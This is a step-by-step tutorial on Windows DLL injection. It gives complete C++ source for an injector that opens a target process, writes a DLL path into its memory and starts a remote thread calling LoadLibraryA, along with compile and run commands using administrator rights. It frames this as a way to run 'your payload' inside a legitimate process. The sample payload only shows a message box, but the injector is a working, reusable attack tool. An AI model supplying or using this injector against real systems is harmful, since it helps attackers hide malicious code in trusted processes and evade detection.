# Summary
DLL injection is a technique used to run custom code within the address space of another process by loading a dynamic link library (DLL) into that process. This method allows you to execute code within the context of another process without creating a new process or writing the code to disk.

Here's an overview of how you could perform DLL injection to execute your payload within the memory of a legitimate process:

1. **Prepare the Payload**: Create your payload in the form of a DLL that contains the code you want to execute within the target process.
2. **Open the Target Process**: Obtain a handle to the target process with appropriate access rights.   
3. **Allocate Memory in the Target Process**: Allocate memory within the target process for the DLL path.
4. **Write the DLL Path to the Target Process Memory**: Write the path of your DLL into the allocated memory space in the target process.   
5. **Load the DLL**: Create a remote thread in the target process that calls `LoadLibraryA` (or `LoadLibraryW`) with the address of the DLL path, effectively loading your DLL into the target process.

---
# Execution
To execute the DLL injection code provided, follow these steps:

1. **Compile the C++ Program**: You need to compile the C++ code into an executable. You can use tools like Visual Studio or MinGW to compile the code.
2. **Prepare the DLL**: Ensure that your payload is compiled into a DLL and that the path to this DLL is correctly specified in the C++ code.   
3. **Run the Executable with Elevated Privileges**: Since DLL injection involves manipulating another process's memory space, it often requires elevated privileges. Ensure you run the compiled executable with administrator rights.

## Step 1: Prepare the Payload
Assume you have a payload in the form of a DLL (e.g., a DLL that displays a message box):

1. **Create the DLL**: Write your payload code in a DLL format. For example, you can use the following C++ code to create a DLL that shows a message box:

```
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, L"Injected!", L"Success", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

2. **Compile the DLL**: Compile the above code into a DLL using a C++ compiler like Visual Studio or MinGW.

## Step 2: Compile the C++ Code for DLL Injection
Using Visual Studio or MinGW:

1. **Create a New Console Project**:
    
    - For Visual Studio:
        - Open Visual Studio.
        - Create a new project.
        - Select "Console App".
        - Set the project name and location.
        
    - For MinGW:
        - Create a new directory for your project.
        - Place the C++ code file in this directory.
        
2. **Replace the Content of the Main CPP File**: Replace the content of the main CPP file with the provided C++ code for DLL injection.
    
3. **Compile the Project**:
    
    - For Visual Studio:        
        - Build the project (Ctrl+Shift+B).
        
    - For MinGW:        
        - Open a terminal or command prompt.
        - Navigate to the directory containing the C++ code file.
        - Compile the code using the following command:

```
g++ -o DLLInjector DLLInjector.cpp
```

## Step 3: Execute the Compiled Executable

1. **Open Command Prompt with Administrator Rights**: Search for "cmd" in the start menu, right-click on Command Prompt, and select "Run as administrator".
    
2. **Navigate to the Directory Containing the Executable**:

```
cd path\to\DLLInjector
```

3. **Run the Executable**:

```
DLLInjector.exe <target_process_id> <path_to_dll>
```

Replace `<target_process_id>` with the process ID of the target process and `<path_to_dll>` with the full path to your DLL.

---
# Example Execution
Below is a simplified walkthrough:

## Step 1: Prepare the DLL payload:

```
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL, L"Injected!", L"Success", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
## Step 2: Compile the DLL:

- Save the above code in a file named `payload.cpp`.
- Open a terminal or command prompt.
- Navigate to the directory containing `payload.cpp`.
- Compile the code into a DLL:

```
g++ -shared -o payload.dll payload.cpp
```

## Step 3: Replace the content of the main CPP file for DLL injection:

```
#include <windows.h>
#include <iostream>
#include <string>

int main(int argc, char* argv[])
{
    if (argc != 3)
    {
        std::cerr << "Usage: " << argv[0] << " <target_process_id> <path_to_dll>" << std::endl;
        return 1;
    }

    DWORD processId = std::stoul(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL)
    {
        std::cerr << "Failed to open target process." << std::endl;
        return 1;
    }

    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocMem == NULL)
    {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    BOOL written = WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);
    if (!written)
    {
        std::cerr << "Failed to write DLL path to target process memory." << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMem, 0, NULL);
    if (hThread == NULL)
    {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully." << std::endl;
    return 0;
}
```

## Step 4: Compile the code:

- Save the above code in a file named `DLLInjector.cpp`.
- Open a terminal or command prompt.
- Navigate to the directory containing `DLLInjector.cpp`.
- Compile the code:

```
g++ -o DLLInjector DLLInjector.cpp
```

## Step 5: Run the executable:

- Open Command Prompt with administrator rights.
- Navigate to the directory containing the compiled executable.
- Run the executable:

```
DLLInjector.exe <target_process_id> <path_to_dll>
```

Replace `<target_process_id>` with the process ID of the target process and `<path_to_dll>` with the full path to your DLL.

This should inject the DLL into the target process, executing the payload (in this example, displaying a message box).

---
# Example Code
Here's a conceptual example in C++ using the OpenProcess, VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread functions from the Windows API:

```
#include <windows.h>
#include <iostream>
#include <string>

int main(int argc, char* argv[])
{
    if (argc != 3)
    {
        std::cerr << "Usage: " << argv[0] << " <target_process_id> <path_to_dll>" << std::endl;
        return 1;
    }

    DWORD processId = std::stoul(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL)
    {
        std::cerr << "Failed to open target process." << std::endl;
        return 1;
    }

    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocMem == NULL)
    {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    BOOL written = WriteProcessMemory(hProcess, allocMem, dllPath, strlen(dllPath) + 1, NULL);
    if (!written)
    {
        std::cerr << "Failed to write DLL path to target process memory." << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMem, 0, NULL);
    if (hThread == NULL)
    {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully." << std::endl;
    return 0;
}
```

Replace `<path_to_dll>` with the full path to your DLL. Ensure that you have proper permissions to manipulate the target process. This example demonstrates the general steps involved in DLL injection.